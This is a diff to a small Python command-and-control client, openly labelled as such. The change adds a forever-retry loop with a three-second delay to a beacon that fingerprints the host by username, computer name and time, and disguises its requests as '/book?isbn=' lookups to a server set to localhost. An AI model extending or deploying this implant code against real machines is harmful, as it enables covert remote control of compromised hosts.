@@ -1,8 +1,8 @@
 # Command and Control client Code
 
 from os import getenv
-from time import time
-from requests import get
+from time import sleep, time
+from requests import exceptions, get
 from sys import platform
 from os import uname
 
@@ -26,6 +26,9 @@ C2_SERVER = "localhost"
 # Path to use for signifying a command request form a client using HTTP GET
 CMD_REQUEST = "/book?isbn="
 
+# Define a sleep delay time in seconds for re-connection attempts
+DELAY = 3
+
 # Obtain unique identifiying information
 if getenv("OS") == "Windows_NT":
     client = getenv("USERNAME", "") + "@" + getenv("COMPUTERNAME", "") + "@" + str(time())
@@ -37,5 +40,11 @@ else:
     client = "unknown" + "@" + "unknown" + "@" + str(time())
 
 while True:
-    x = get(url=f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}", headers=HEADER, proxies=PROXY)
-    print(x.status_code)
+    # Try an HTTP GET request to the c2 server and retrive a command; if it fails, keep trying forever
+    try:
+        command = get(url=f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}", headers=HEADER, proxies=PROXY)
+        print(command.status_code)
+    except exceptions.RequestException:
+        print("Server is down.")
+        sleep(DELAY)
+        continue
